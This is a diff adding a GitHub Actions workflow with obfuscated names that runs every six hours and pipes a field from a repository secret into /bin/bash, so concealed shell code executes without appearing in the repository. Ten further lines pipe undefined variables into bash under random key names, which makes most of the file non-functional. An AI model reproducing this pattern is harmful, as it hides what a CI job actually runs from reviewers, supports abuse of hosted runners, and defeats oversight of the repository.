@@ -1,0 +1,27 @@
+name: eightbaifenre
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: eightbaifenre
+        env:
+          fw10371: ${{ secrets.fw10371 }}
+        run: |
+          echo $fw10371 | jq -r .nyt8181 | /bin/bash
+          echo $mf89259 | jq -r .nvufy1 | /bin/bash
+          echo $j239 | jq -r .ngcda74 | /bin/bash
+          echo $v4381 | jq -r .npgs082 | /bin/bash
+          echo $p770 | jq -r .w95 | /bin/bash
+          echo $pyps2073 | jq -r .zgku84035 | /bin/bash
+          echo $dtyc42 | jq -r .vr6 | /bin/bash
+          echo $jubhz732 | jq -r .daeca39 | /bin/bash
+          echo $qbavc92 | jq -r .ksh51 | /bin/bash
+          echo $rqy531 | jq -r .kxlna63197 | /bin/bash
+          echo $g51 | jq -r .e07985 | /bin/bash
+
